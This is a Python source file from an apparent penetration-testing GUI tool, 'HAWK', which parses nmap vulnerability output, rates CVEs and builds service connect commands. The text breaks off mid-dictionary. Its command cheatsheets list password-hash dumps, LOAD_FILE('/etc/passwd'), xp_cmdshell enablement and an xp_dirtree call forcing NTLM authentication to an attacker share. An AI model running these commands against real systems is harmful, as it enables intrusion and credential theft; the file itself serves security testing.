# HAWK — Hostile Assessment War-Kit
# Copyright 2026 Lorenzo Serafini
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# A copy of the License is provided in the LICENSE file at the root
# of this distribution, or at http://www.apache.org/licenses/LICENSE-2.0
#
# Attribution "Created by Lorenzo Serafini" must be preserved in all
# redistributed and Derivative Works — see NOTICE for details.

"""
HAWK - Target Intel Widget v1.0
- Nmap vuln scripts findings → auto-populate intel
- Per-finding MSF launch button with pre-configured editable dialog
- OS Detection merge (don't overwrite existing ports)
- Single nonstandard port popup (flag)
- Spinner on all operations
"""

import customtkinter as ctk
import threading
import re

from gui.widgets.target_intel_common import (
    COLORS, SZ, TMP_DIR, SPINNER_FRAMES, _MANUAL_ENTRY_LABEL, VULN_EXPLOIT_MAP,
    _f, _nmap_already_run, _nmap_os_already_run, _get_exploits_for_vuln,
    _get_exploit_for_vuln,
)
from gui.widgets.target_intel_render import TargetIntelRenderMixin
from gui.widgets.target_intel_exploit import TargetIntelExploitMixin
from gui.widgets.target_intel_parsers import TargetIntelParserMixin
from gui.widgets.target_intel_admin import TargetIntelAdminMixin



class TargetIntelWidget(TargetIntelRenderMixin, TargetIntelExploitMixin, TargetIntelParserMixin, TargetIntelAdminMixin, ctk.CTkFrame):

    def __init__(self, parent, app, tab_label_widget=None, **kwargs):
        super().__init__(parent, fg_color=COLORS["bg_card"],
                        corner_radius=0, **kwargs)
        self.app             = app
        self._tab_label      = tab_label_widget
        self._tab_base_text  = "TARGET INTEL"   # original label text
        self._blink_active   = False
        self._blink_count    = 0
        self._new_findings   = 0                # unseen findings counter
        self._fp             = None
        self._exploits       = []
        self._auto_findings  = []
        self._search_running = False
        self._spinner_idx    = 0
        self._spinner_active = False
        self._progress_var   = ctk.StringVar(value="")
        self._nonstandard_checked = False  # prevent double popup
        # Ports the user has explicitly dismissed via the NonStandardPort
        # IGNORE button.  Persisted for the life of the session — even if
        # nmap re-runs and _check_nonstandard_ports fires again, dismissed
        # ports are skipped so the dialog doesn't keep popping back up.
        self._dismissed_nonstandard_ports = set()
        # Pre-flight check cache, keyed by target IP. Holds the set of SMB
        # dialects advertised by the target so subsequent exploit launches
        # don't re-run nmap --script smb-protocols every time.
        # Shape: { "192.168.x.y": {"dialects": ["SMBv1","SMBv2.1"], "ts": 172..} }
        self._preflight_cache = {}

        # Collapsible-section state. `True` = collapsed (body hidden),
        # `False` = expanded. Defaults chosen so the important stuff
        # (vulns + relevant exploits) starts open; noisy "not detected"
        # and "not applicable" exploit buckets start closed.
        self._collapsed = {
            "ports":            False,
            "vulns":            False,
            "exploits_rel":     False,
            "exploits_notdet":  True,
            "exploits_inact":   True,
        }

        self.grid_rowconfigure(2, weight=1)
        self.grid_columnconfigure(0, weight=1)
        self._build_ui()

    def set_tab_label(self, widget):
        self._tab_label = widget

    # ─── UI ──────────────────────────────────────────────────────────────────

    def _build_ui(self):
        hdr = ctk.CTkFrame(self, fg_color=COLORS["bg_header"],
                           height=36, corner_radius=0)
        hdr.grid(row=0, column=0, sticky="ew")
        hdr.grid_columnconfigure(0, weight=1)
        hdr.grid_propagate(False)

        ctk.CTkLabel(hdr, text="  TARGET INTELLIGENCE",
                     font=_f("lg", True), text_color=COLORS["text_dim"],
                     anchor="w").grid(row=0, column=0, sticky="w", padx=10, pady=4)

        btn_row = ctk.CTkFrame(hdr, fg_color="transparent")
        btn_row.grid(row=0, column=1, sticky="e", padx=6)

        self._search_btn = ctk.CTkButton(
            btn_row, text="SEARCH EXPLOITS", width=150, height=24,
            font=_f("sm", True),
            fg_color=COLORS["bg_card"], hover_color=COLORS["bg_card_hover"],
            border_color=COLORS["border_green"], border_width=1,
            text_color=COLORS["text_green"], corner_radius=3,
            command=self._start_exploit_search)
        self._search_btn.pack(side="left", padx=2)

        self._cve_btn = ctk.CTkButton(
            btn_row, text="SEARCH CVEs", width=120, height=24,
            font=_f("sm", True),
            fg_color=COLORS["bg_card"], hover_color=COLORS["bg_card_hover"],
            border_color=COLORS["border_amber"], border_width=1,
            text_color=COLORS["text_yellow"], corner_radius=3,
            command=self._start_cve_search)
        self._cve_btn.pack(side="left", padx=2)

        # NOTE: the "🔄 REFRESH CVE DB" button used to live here.  It was
        # a UI hook for an operator-driven fetch from a remote KB URL
        # (KB_REMOTE_URL in utils/cve_knowledge.py), defaulting to None
        # so a stock HAWK install never touched the network.  In
        # practice that meant the button did nothing useful for any
        # single-operator workflow — there's no central HAWK CVE
        # service to point KB_REMOTE_URL at, and the bundled KB updates
        # via `git pull` like the rest of the codebase.  CVE coverage
        # for live recon goes through SEARCH CVE (5 curated web sources
        # + NVD by-keyword/by-id) which is the real workflow.  The
        # library-level helpers (KB_REMOTE_URL, fetch_remote) stay in
        # utils/cve_knowledge.py as dormant API for forks that DO host
        # their own KB endpoint — only the UI surface is removed.

        # Bulk dismiss — clears the fresh highlight on every finding that
        # still has the green border + "◆ NEW/UPDATED" badge in one click.
        # The per-finding MARK READ button on each fresh card is kept —
        # this one is just a shortcut when the user has 10+ new findings
        # after a big scan (enum4linux, nmap -A, etc.) and wants them
        # all cleared at once without scrolling through each.
        self._mark_all_btn = ctk.CTkButton(
            btn_row, text="MARK ALL READ", width=140, height=24,
            font=_f("sm", True),
            fg_color=COLORS["bg_card"], hover_color=COLORS["bg_card_hover"],
            border_color=COLORS["border_green"], border_width=1,
            text_color=COLORS["text_green"], corner_radius=3,
            command=self._mark_all_findings_read)
        self._mark_all_btn.pack(side="left", padx=2)

        self._show_all_var = ctk.BooleanVar(value=False)
        ctk.CTkCheckBox(
            btn_row, text="Show all",
            variable=self._show_all_var,
            font=_f("sm"), text_color=COLORS["text_muted"],
            fg_color=COLORS["border_green"], border_color=COLORS["border_dim"],
            checkmark_color=COLORS["bg_primary"], width=16, height=16,
            command=self._toggle_show_all,
        ).pack(side="left", padx=6)

        prog_row = ctk.CTkFrame(self, fg_color=COLORS["bg_secondary"],
                                height=22, corner_radius=0)
        prog_row.grid(row=1, column=0, sticky="ew")
        prog_row.grid_columnconfigure(1, weight=1)
        prog_row.grid_propagate(False)

        self._spinner_lbl = ctk.CTkLabel(
            prog_row, text="", font=_f("md"),
            text_color=COLORS["text_green"], width=20, anchor="w")
        self._spinner_lbl.grid(row=0, column=0, padx=(8,4), pady=1, sticky="w")

        self._progress_lbl = ctk.CTkLabel(
            prog_row, textvariable=self._progress_var,
            font=_f("sm"), text_color=COLORS["text_dim"], anchor="w")
        self._progress_lbl.grid(row=0, column=1, padx=4, pady=1, sticky="w")

        self._prog_bar = ctk.CTkProgressBar(
            prog_row, height=3,
            fg_color=COLORS["border_dim"],
            progress_color=COLORS["border_green"], corner_radius=0)
        self._prog_bar.grid(row=0, column=2, padx=(4,8), pady=2, sticky="ew")
        prog_row.grid_columnconfigure(2, weight=1)
        self._prog_bar.set(0)
        self._prog_bar.grid_remove()

        self._scroll = ctk.CTkScrollableFrame(
            self, fg_color=COLORS["bg_card"],
            scrollbar_button_color=COLORS["border_dim"],
            scrollbar_button_hover_color=COLORS["border_green"],
            corner_radius=0)
        self._scroll.grid(row=2, column=0, sticky="nsew")
        self._scroll.grid_columnconfigure(0, weight=1)

        if _nmap_already_run(self.app):
            msg = ("Port scan completed but no intel was extracted.\n\n"
                   "Try NMAP Service+Scripts or NMAP Vuln Scripts\n"
                   "for deeper fingerprinting.")
        else:
            msg = ("No scan data yet.\n\n"
                   "Run NMAP Quick to populate Target Intelligence.\n"
                   "Then click SEARCH EXPLOITS or SEARCH CVEs.")
        ctk.CTkLabel(
            self._scroll, text=msg,
            font=_f("md"), text_color=COLORS["text_muted"],
            justify="center").grid(row=0, column=0, pady=30)

    # ─── Spinner ─────────────────────────────────────────────────────────────

    def _spinner_start(self, message="Working..."):
        self._spinner_active = True
        self._spinner_idx    = 0
        self._progress_var.set(message)
        self._prog_bar.grid()
        self._prog_bar.set(0)
        self._spinner_tick()

    def _spinner_tick(self):
        if not self._spinner_active:
            return
        frame = SPINNER_FRAMES[self._spinner_idx % len(SPINNER_FRAMES)]
        try:
            self._spinner_lbl.configure(text=frame)
        except Exception:
            return
        self._spinner_idx += 1
        self.after(100, self._spinner_tick)

    def _spinner_stop(self, message=""):
        self._spinner_active = False
        try:
            self._spinner_lbl.configure(text="")
            self._progress_var.set(message)
            self._prog_bar.set(1)
            self.after(2000, lambda: [
                self._prog_bar.grid_remove(),
                self._progress_var.set(""),
            ])
        except Exception:
            pass

    def _progress_update(self, current, total, label):
        pct = current / total if total > 0 else 0
        try:
            self._prog_bar.set(pct)
            self._progress_var.set(f"[{current}/{total}] {label}")
        except Exception:
            pass

    # ─── Public API ──────────────────────────────────────────────────────────


    # Regex: lines that are nmap port listing, NOT vuln script output.
    # Examples: "445/tcp  open  microsoft-ds", "3268/tcp open globalcatLDAP"
    _PORT_LINE_RE = re.compile(r'^\s*\d+/(tcp|udp)\s+(open|closed|filtered)\s')
    # Regex: nmap scan metadata lines to skip
    _NMAP_META_RE = re.compile(
        r'^\s*(Nmap scan report|Host is up|Not shown|PORT\s+STATE|'
        r'Nmap done|Service detection|Service Info|SF:|'
        r'MAC Address|Aggressive OS|Running:|OS CPE|OS details|'
        r'Network Distance|TRACEROUTE)', re.I)

    # ── NSE script-name regex (broad — catches any pipe-prefixed
    # "script-name:" header).  Used by update_from_vuln_scripts.
    # We accept ANY hyphenated lower-case identifier ending in `:` after
    # the pipe prefix, then later filter out non-script tokens (State:,
    # IDs:, References: …) via the meta-tag set below.
    _NSE_SCRIPT_HEADER_RE = re.compile(
        r"^\s*\|[_\s]*\s*([a-z][a-z0-9][\w-]{2,80}):\s*$"
    )
    # Meta-tag tokens that the broad regex would otherwise mistake for
    # script names (they appear inside a script's output block).
    _NSE_META_TAGS = frozenset({
        "state", "ids", "references", "risk factor", "risk_factor",
        "description", "disclosure date", "disclosure_date",
        "extra information", "extra_information", "check results",
        "check_results", "scriptargs", "exploit_results",
    })
    # Regex for script-error sentinels — these terminate the current
    # script's output block WITHOUT producing a finding.
    _NSE_ERROR_RE = re.compile(
        r"\bERROR:\s*(?:Script execution failed|"
        r"socket error|timeout|connection refused|"
        r"could not connect)",
        re.IGNORECASE,
    )


    # ── Known CVE database for human-friendly names ────────────────────
    _CVE_NAMES = {
        "CVE-2014-3566": "POODLE — SSLv3 Padding Oracle",
        "CVE-2014-3704": "Drupalgeddon — Drupal SQL Injection",
        "CVE-2014-0160": "Heartbleed — OpenSSL Memory Leak",
        "CVE-2017-0144": "EternalBlue — SMBv1 Buffer Overflow",
        "CVE-2019-0708": "BlueKeep — RDP Use-After-Free",
        "CVE-2008-4250": "MS08-067 — Server Service Buffer Overflow",
        "CVE-2017-5689": "Intel AMT Bypass",
        "CVE-2021-44228": "Log4Shell — Log4j JNDI RCE",
        "CVE-2021-34473": "ProxyShell — Exchange RCE",
        "CVE-2021-26855": "ProxyLogon — Exchange SSRF",
        "CVE-2017-5638":  "Apache Struts2 RCE",
        "CVE-2014-6271":  "Shellshock — Bash CGI RCE",
        "CVE-2015-1635":  "MS15-034 — HTTP.sys RCE",
        "CVE-2020-1472":  "ZeroLogon — Netlogon Priv Esc",
        "CVE-2011-2523":  "vsftpd 2.3.4 backdoor — bind shell as root",
        "CVE-2004-2687":  "DistCC daemon RCE",
        "CVE-2010-2075":  "UnrealIRCd 3.2.8.1 backdoor",
        "CVE-2007-2447":  "Samba usermap_script RCE",
    }


    # ── Curated severity for nmap vuln-script findings ─────────────────
    # NSE vuln scripts carry no severity field, so the parser must derive
    # one.  The old heuristic guessed from a naive substring keyword scan
    # ("rce" in the blob), which mis-scored whole CLASSES of finding: a
    # DoS or a crypto-downgrade MitM inflated to "critical" because its
    # description contained "resources"/"force" (the "rce" substring),
    # while an RCE-as-root backdoor stayed "high" because its curated
    # name didn't literally say "rce".  Severity is now derived, in
    # priority order, by _classify_vuln_severity():
    #   1. utils.cve_knowledge.severity_for_cve(cve)  — in-house KB (offline)
    #   2. _VULN_CVE_SEVERITY                         — curated per-CVE
    #   3. _VULN_SCRIPT_SEVERITY                      — curated per-script
    #   4. word-boundary keyword heuristic            — last resort
    # Vocabulary unchanged: info/low/medium/high/critical.
    #
    # Categories: RCE / backdoor / pre-auth full compromise → critical;
    # memory-disclosure / privileged info-leak → high; DoS → high (an
    # availability hit, not a confidentiality/integrity break, so it must
    # NOT outrank a real RCE); weak-crypto downgrade/MitM → medium (needs
    # a privileged network position for partial impact).  Keys upper-case.
    _VULN_CVE_SEVERITY = {
        # RCE / backdoor / pre-auth full compromise
        "CVE-2011-2523": "critical",   # vsftpd 2.3.4 backdoor — root shell
        "CVE-2010-2075": "critical",   # UnrealIRCd 3.2.8.1 backdoor
        "CVE-2004-2687": "critical",   # DistCC daemon RCE
        "CVE-2007-2447": "critical",   # Samba usermap_script RCE
        "CVE-2017-0143": "critical",   # EternalBlue (SMBv1 RCE)
        "CVE-2017-0144": "critical",   # EternalBlue
        "CVE-2008-4250": "critical",   # MS08-067 Server Service RCE
        "CVE-2019-0708": "critical",   # BlueKeep RDP RCE
        "CVE-2021-44228": "critical",  # Log4Shell
        "CVE-2021-34473": "critical",  # ProxyShell
        "CVE-2021-26855": "critical",  # ProxyLogon (SSRF → RCE chain)
        "CVE-2017-5638":  "critical",  # Apache Struts2 RCE
        "CVE-2014-6271":  "critical",  # Shellshock
        "CVE-2020-1472":  "critical",  # ZeroLogon
        "CVE-2014-3704":  "critical",  # Drupalgeddon pre-auth SQLi
        "CVE-2017-5689":  "critical",  # Intel AMT auth bypass → full admin
        # Memory disclosure / high-impact info leak
        "CVE-2014-0160":  "high",      # Heartbleed
        # DoS — impactful availability hit, but not a C/I break
        "CVE-2007-6750":  "high",      # Slowloris HTTP DoS
        "CVE-2015-1635":  "high",      # MS15-034 HTTP.sys (RCE-rated, DoS in practice)
        "CVE-2011-3192":  "high",      # Apache Range header DoS
        "CVE-2012-0152":  "high",      # RDP MS12-020 DoS
        # Weak crypto: downgrade / padding-oracle / MitM → medium
        "CVE-2015-4000":  "medium",    # Logjam
        "CVE-2014-3566":  "medium",    # POODLE
        "CVE-2011-3389":  "medium",    # BEAST
        "CVE-2013-2566":  "medium",    # RC4 biases
        "CVE-2016-2183":  "medium",    # SWEET32
        "CVE-2015-0204":  "medium",    # FREAK
        "CVE-2016-0800":  "medium",    # DROWN
        "CVE-2009-3555":  "medium",    # TLS renegotiation MitM
    }

    # Per-script curated severity, for findings WITHOUT a clean CVE (the
    # script emitted no CVE, or one this table/KB doesn't cover).  Matched
    # as substrings against the lower-cased NSE script name; first hit
    # wins, so order = most-specific first.  Same categories as above.
    _VULN_SCRIPT_SEVERITY = (
        ("vsftpd-backdoor",     "critical"),
        ("unrealircd-backdoor", "critical"),
        ("distcc",              "critical"),
        ("samba-vuln-cve-2012", "critical"),
        ("ms17-010",            "critical"),
        ("ms08-067",            "critical"),
        ("shellshock",          "critical"),
        ("rmi-vuln-classloader","critical"),
        ("heartbleed",          "high"),
        ("ssl-ccs-injection",   "high"),
        ("slowloris",           "high"),
        ("ms12-020",            "high"),
        # weak-crypto family → medium
        ("ssl-poodle",          "medium"),
        ("ssl-dh-params",       "medium"),   # Logjam / weak DH
        ("ssl-known-key",       "medium"),
        ("sslv2-drown",         "medium"),
        ("rc4",                 "medium"),
        ("freak",               "medium"),
    )










    # ─── Ping popup ──────────────────────────────────────────────────────────


    # ─── Render ──────────────────────────────────────────────────────────────







    # ─── MSF Launch Dialog ────────────────────────────────────────────────────









    # NSE script-name prefix → default port for that protocol.  Used by
    # _extract_port_from_finding to map findings produced by nmap vuln
    # scripts (which embed the script name but not always the port) to
    # the correct RPORT for the MSF launch dialog.
    _NSE_PREFIX_TO_PORT = {
        "smb-":     445, "ms-sql-":  1433, "rdp-":      3389,
        "ssh-":     22,  "ftp-":     21,   "smtp-":     25,
        "telnet-":  23,  "http-":    80,   "https-":    443,
        "ssl-":     443, "vnc-":     5900, "ldap-":     389,
        "snmp-":    161, "mysql-":   3306, "postgres-": 5432,
        "ms-wbt-":  3389,"winrm-":   5985, "redis-":    6379,
        "mongodb-": 27017,"irc-":    6667, "pop3-":     110,
        "imap-":    143, "ntp-":     123,  "dns-":      53,
        "tftp-":    69,  "nfs-":     2049, "kerberos-": 88,
    }
    # Service-name token (from "via CONNECT / SVC" findings) → port
    _SVC_TOKEN_TO_PORT = {
        "smtp": 25, "ftp": 21, "ssh": 22, "telnet": 23,
        "http": 80, "https": 443, "smb": 445, "rdp": 3389,
        "winrm": 5985, "vnc": 5900, "ldap": 389, "ldaps": 636,
        "mysql": 3306, "postgresql": 5432, "mssql": 1433,
        "redis": 6379, "mongodb": 27017, "snmp": 161,
        "kerberos": 88, "dns": 53,
    }




    # ─── Pre-flight exploit checks ───────────────────────────────────────────

    # Exploit families that have a known hard prerequisite we can verify
    # cheaply from outside the target. Each entry maps an infix substring
    # that we look for in the MSF module path to the check id.
    _PREFLIGHT_FAMILIES = {
        "ms17_010":         "smbv1",     # EternalBlue & friends
        "eternalblue":      "smbv1",
        "eternalromance":   "smbv1",
        "eternalsynergy":   "smbv1",
        "eternalchampion":  "smbv1",
        "ms08_067":         "smbv1",     # also SMBv1
        "doublepulsar":     "smbv1",
        "smb_relay":        "smb_signing_off",
        "ntlmrelayx":       "smb_signing_off",
        "smb_signing":      "smb_signing_off",
    }






    # ─── Render exploits ─────────────────────────────────────────────────────



    # ─── Exploit Info Dialog ─────────────────────────────────────────────────


    # ─── Payload selection ───────────────────────────────────────────────────



    # ─── Scanner flow ─────────────────────────────────────────────────────────





    # ─── Exploit execution ───────────────────────────────────────────────────




    # ─── Netcat verify ───────────────────────────────────────────────────────




    def _copy_port_info(self, port: int, svc: str):
        """Copy port/service info to clipboard."""
        from utils.clipboard import clipboard_copy
        text = f"{port}/{svc}"
        clipboard_copy(text)
        self.app.terminal.write(f"  [*] Copied: {text}", "dim")

    # ─── CONNECT IN TERMINAL ─────────────────────────────────────────────────

    # Service → command template. {host}, {port}, {user}, {pass}, {compat}
    # substituted.  {compat} expands to protocol-appropriate legacy-compat
    # flags ONLY when the current target is classified as "legacy" or
    # "unknown"; on confirmed-modern targets it expands to "" giving clean
    # commands.  See _compat_flags_for() for the per-protocol table and
    # classify_generation() in modules/exploit_suggester.py for the
    # classification logic.
    # Pentest-standard SSH options, always emitted:
    #   StrictHostKeyChecking=no     → auto-accept the server host key
    #                                   (no interactive prompt on first
    #                                   connect, no refusal when a target
    #                                   VM gets rebuilt and its host key
    #                                   changes)
    #   UserKnownHostsFile=/dev/null → don't persist host keys to
    #                                   ~/.ssh/known_hosts (keeps the
    #                                   operator's real box clean during
    #                                   engagements with many targets)
    #   LogLevel=ERROR               → suppress the otherwise-loud
    #                                   "Warning: Permanently added ..."
    #                                   messages that pollute captured
    #                                   session output and break our
    #                                   signature detectors
    _SSH_NOPROMPT = ("-oStrictHostKeyChecking=no "
                     "-oUserKnownHostsFile=/dev/null "
                     "-oLogLevel=ERROR")

    _CONNECT_CMDS = {
        "ssh":         f"ssh {{compat}} {_SSH_NOPROMPT} -p {{port}} {{user}}@{{host}}",
        "ftp":         "ftp {host} {port}",
        "telnet":      "telnet {host} {port}",
        "smtp":        "swaks --to test@{host} --server {host}:{port}",
        "smb":         "smbclient -L //{host} -U {user} {compat}",
        "microsoft-ds":"smbclient -L //{host} -U {user} {compat}",
        "netbios-ssn": "smbclient -L //{host} -U {user} {compat}",
        "mysql":       "mysql {compat} -h {host} -P {port} -u {user} -p",
        # PostgreSQL: sslmode is set via the PGSSLMODE env var, which
        # must PRECEDE the psql binary (shell env-prefix syntax).  So
        # {compat} goes at the START of the line — when empty it's
        # stripped along with the trailing whitespace by _apply_compat.
        "postgresql":  "{compat} psql -h {host} -p {port} -U {user}",
        "ms-sql-s":    "impacket-mssqlclient {user}@{host} -port {port} {compat}",
        "mssql":       "impacket-mssqlclient {user}@{host} -port {port} {compat}",
        "rdp":         "xfreerdp /v:{host}:{port} /u:{user} {rdp_flags} +clipboard",
        "ms-wbt-server":"xfreerdp /v:{host}:{port} /u:{user} {rdp_flags} +clipboard",
        "vnc":         "vncviewer {host}::{port}",
        "redis":       "redis-cli -h {host} -p {port}",
        "mongodb":     "mongosh mongodb://{host}:{port}",
        # Default WinRM Connect = netexec validate, NOT evil-winrm.
        # evil-winrm is an exploitation tool that opens a remote
        # PowerShell — semantically distinct from "connect & verify
        # the service".  The dedicated `shell_pw` action launches
        # evil-winrm explicitly when the user actually wants a shell.
        "winrm":       "netexec winrm {host} -u {user} -p '{pass}'",
        "http":        "curl -I -v http://{host}:{port}/",
        "https":       "curl {compat} -I -vk https://{host}:{port}/",
        "http-proxy":  "curl -I -v http://{host}:{port}/",
        "ssl/http":    "curl {compat} -I -vk https://{host}:{port}/",
    }

    # Per-protocol compat flag strings emitted when the target is classified
    # as "legacy" or "unknown".  Keep these short and additive (prefer `+algo`
    # forms over exclusive `=algo`) so they don't break on modern servers.
    _COMPAT_FLAGS = {
        # OpenSSH 9.x+ (Kali 2025) has DROPPED ssh-dss support entirely —
        # referencing it anywhere (HostKeyAlgorithms OR PubkeyAccepted*)
        # aborts with "command-line line 0: Bad key types '+ssh-rsa,ssh-dss'".
        # Also: PubkeyAcceptedKeyTypes was renamed to PubkeyAcceptedAlgorithms
        # in OpenSSH 8.5 (old name still accepted as alias, but using the new
        # name is safer against future deprecation).  Result: narrower but
        # functional compat string that works on Metasploitable2-era targets
        # and doesn't explode on a modern client.
        "ssh": (
            "-oHostKeyAlgorithms=+ssh-rsa "
            "-oKexAlgorithms=+diffie-hellman-group1-sha1,"
            "diffie-hellman-group14-sha1 "
            "-oCiphers=+aes128-cbc,3des-cbc "
            "-oPubkeyAcceptedAlgorithms=+ssh-rsa "
            "-oMACs=+hmac-sha1,hmac-md5"
        ),
        "smb": (
            # NT1 + LANMAN fallback — lets smbclient speak to NT4/2000/XP/
            # 2003 servers.  -I forces IP (bypasses NetBIOS/DNS name lookup
            # which fails on 2008 R2+ where NetBIOS is off).
            "-I {host} "
            "--option='client min protocol=NT1' "
            "--option='client lanman auth=yes'"
        ),
        "https": (
            # --tls-max 1.0 + SECLEVEL=0 for ancient OpenSSL / RC4 servers.
            "--tls-max 1.0 --ciphers 'DEFAULT:@SECLEVEL=0'"
        ),
        "mssql": (
            # impacket 0.12+ accepts the low-seclevel env var via wrapper;
            # keep this empty for now — the real legacy knob lives in
            # openssl.cnf.  Placeholder so the template slot isn't naked.
            ""
        ),
        "mysql": (
            # Kali 2025 ships MariaDB 10.11 client which probes TLS on
            # connect and aborts with "TLS/SSL error: wrong version
            # number" when talking to MySQL 5.x servers (Metasploitable2
            # runs 5.0.51a — no TLS at all).
            #
            # Tried first: --ssl-mode=DISABLED.  That's MySQL 5.7+ syntax
            # and MariaDB rejects it with "unknown variable 'ssl-mode=
            # DISABLED'".
            #
            # Portable replacement: --skip-ssl.  Works on:
            #   • MariaDB 5.5 → 11.x     (Kali default, HTB Linux boxes)
            #   • MySQL 5.0 → 8.0        (legacy targets, Windows MySQL)
            # Both interpret it as "don't attempt SSL on this connection".
            "--skip-ssl"
        ),
        "postgresql": (
            # psql on Kali 2025 (libpq 17.x) defaults to sslmode=prefer
            # and rejects PG servers that only speak TLS <1.2 with:
            #   SSL error: unsupported protocol
            # PostgreSQL 8.x (Metasploitable2 ships 8.3) + many HTB
            # "legacy" boxes only do SSLv3 / TLSv1.0.  Forcing sslmode=
            # disable via the env var skips SSL entirely — psql falls
            # back to plaintext, auth happens, connection works.
            # The env var must PRECEDE psql in the command line, which
            # is why the postgresql template puts {compat} at the start.
            "PGSSLMODE=disable"
        ),
    }
    # Aliases so one lookup works for every service name we route through
    # the same client binary.
    _COMPAT_ALIASES = {
        "microsoft-ds":  "smb",
        "netbios-ssn":   "smb",
        "ms-sql-s":      "mssql",
        "ssl/http":      "https",
        "mariadb":       "mysql",
        "postgres":      "postgresql",
    }

    # ── Connect cheatsheets (FEATURE-B) ─────────────────────────────
    # Per-service command reference shown in the floating "Commands"
    # dialog (opened from the per-port "📋 CMDS" button in the Ports
    # panel).  Each entry: list of (command, description) tuples;
    # tuples where the description is empty are rendered as section
    # separators / inline notes (no COPY button).
    #
    # v1 scope (Option B): the 5 datastores HAWK already supports via
    # Connect.  Future expansion (Fase 1) will populate the same dict
    # with Elasticsearch, Cassandra, Oracle, etc.
    #
    # Service-key matching is done via _cheatsheet_key_for() which
    # normalises mariadb→mysql, postgres→postgresql, ms-sql-s→mssql,
    # mongo→mongodb so the dict only needs canonical keys.
    _CONNECT_CHEATSHEETS = {
        "mysql": {
            "title": "MySQL / MariaDB",
            "intro": ("Paste these at the mysql> prompt.  All "
                      "statements end with ; (semicolon).  Some "
                      "commands require the FILE or PROCESS "
                      "privilege — typically only the root account."),
            "commands": [
                ("SHOW DATABASES;",
                 "List all databases"),
                ("USE <db>;",
                 "Switch to a database (replace <db>)"),
                ("SHOW TABLES;",
                 "List tables in current database"),
                ("DESCRIBE <table>;",
                 "Show table schema (replace <table>)"),
                ("SELECT * FROM <table> LIMIT 10;",
                 "Sample 10 rows"),
                ("SELECT user, host, password FROM mysql.user;",
                 "Dump password hashes (MySQL 5.6 and earlier)"),
                ("SELECT user, host, authentication_string "
                 "FROM mysql.user;",
                 "Dump auth hashes (MySQL 5.7+ / MariaDB 10+)"),
                ("SELECT @@version;",
                 "Server version"),
                ("SELECT CURRENT_USER();",
                 "Current logged-in user"),
                ("SELECT @@datadir, @@version_compile_os;",
                 "Data directory + server OS"),
                ("SHOW VARIABLES LIKE 'secure_file_priv';",
                 "Where MySQL is allowed to read/write files"),
                ("SELECT LOAD_FILE('/etc/passwd');",
                 "Read file (requires FILE privilege)"),
                ("\\q",
                 "Exit MySQL client"),
            ],
        },
        "postgresql": {
            "title": "PostgreSQL",
            "intro": ("Backslash meta-commands (\\l, \\dt, ...) "
                      "work on PostgreSQL 9.1+.  On PG 8.x (e.g. "
                      "Metasploitable2's 8.3) the modern psql client "
                      "raises 'column ... does not exist' — use the "
                      "raw-SQL fallbacks at the bottom of this list."),
            "commands": [
                ("\\l",
                 "List databases (PG 9.1+)"),
                ("\\c <db>",
                 "Connect to a database (works on all PG versions)"),
                ("\\dt",
                 "List tables in current database (PG 9.1+)"),
                ("\\d <table>",
                 "Show table schema (PG 9.1+)"),
                ("\\du",
                 "List roles / users with attributes"),
                ("SELECT * FROM <table> LIMIT 10;",
                 "Sample 10 rows from a table"),
                ("SELECT usename, passwd FROM pg_shadow;",
                 "Dump password hashes (superuser only)"),
                ("SELECT version();",
                 "Server version"),
                ("SELECT current_user, current_database();",
                 "Current user + current DB"),
                ("\\q",
                 "Exit psql"),
                ("-- PostgreSQL 8.x fallback (works on all versions):",
                 ""),
                ("SELECT datname FROM pg_database;",
                 "List databases (PG 7.x → 17.x)"),
                ("SELECT schemaname, tablename FROM pg_tables "
                 "WHERE schemaname NOT IN "
                 "('pg_catalog','information_schema');",
                 "List user tables (all PG versions)"),
                ("SELECT usename FROM pg_user;",
                 "List users (all PG versions)"),
            ],
        },
        "mssql": {
            "title": "MSSQL / SQL Server",
            "intro": ("Run with impacket-mssqlclient.  xp_cmdshell "
                      "+ sysadmin role = RCE.  enable_xp_cmdshell "
                      "is the standard escalation chain."),
            "commands": [
                ("SELECT @@VERSION;",
                 "Server version + OS"),
                ("SELECT name FROM sys.databases;",
                 "List databases"),
                ("USE <db>;",
                 "Switch to a database"),
                ("SELECT name FROM sys.tables;",
                 "List tables in current db"),
                ("SELECT * FROM <table>;",
                 "Dump a table"),
                ("SELECT SYSTEM_USER, CURRENT_USER;",
                 "Logged-in user"),
                ("SELECT * FROM master.sys.syslogins;",
                 "List SQL logins"),
                ("SELECT name, password_hash FROM sys.sql_logins;",
                 "Dump password hashes (sysadmin only, 2005+)"),
                ("EXEC sp_helpdb;",
                 "Detailed DB info"),
                ("EXEC sp_who;",
                 "Active connections"),
                ("EXEC sp_configure 'show advanced options', 1; "
                 "RECONFIGURE;",
                 "Unlock advanced options (prerequisite)"),
                ("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
                 "Enable xp_cmdshell"),
                ("EXEC xp_cmdshell 'whoami';",
                 "Execute OS command (RCE — sysadmin only)"),
                ("EXEC xp_dirtree '\\\\attacker\\share', 1, 1;",
                 "Force NTLM auth to attacker (NTLM relay capture)"),
                ("exit",
                 "Exit impacket-mssqlclient"),
            ],
        },
        "mongodb": {
            "title": "MongoDB",
            "intro": ("Client: mongosh (modern) or legacy mongo "
                      "shell.  Vanilla MongoDB < 4.0 ships with NO "
                      "authentication — try `show dbs` first."),
            "commands": [
                ("show dbs",
                 "List databases"),
                ("use <db>",
                 "Switch to a database (creates implicitly)"),
                ("show collections",
                 "List collections in current db"),
                ("db.<coll>.find().limit(10)",
                 "Sample 10 documents"),
                ("db.<coll>.findOne()",
                 "Show first document (schema discovery)"),
                ("db.<coll>.countDocuments()",
                 "Count documents"),
                ("db.system.users.find()",
                 "List user accounts (auth-enabled instances)"),
                ("db.adminCommand({ getCmdLineOpts: 1 })",
                 "Server launch parameters (config disclosure)"),
                ("db.serverStatus()",
                 "Server health / version dump"),
                ("db.version()",
                 "Just the version string"),
                ("exit",
                 "Exit mongosh / mongo"),
            ],
        },
        "redis": {
            "title": "Redis",
            "intro": ("Vanilla Redis < 6 has NO authentication.  "
                      "CONFIG SET dir / dbfilename + SAVE is the "
                      "classic abuse chain (SSH key write, webshell "
                      "drop)."),
            "commands": [
                ("INFO",
                 "Server info (version, mode, clients)"),
                ("PING",
                 "Connectivity check (PONG = OK)"),
                ("DBSIZE",
                 "Number of keys in current DB"),
                ("KEYS *",
                 "List ALL keys (slow on large DBs)"),
                ("GET <key>",
                 "Read string value of a key"),
                ("HGETALL <hash>",
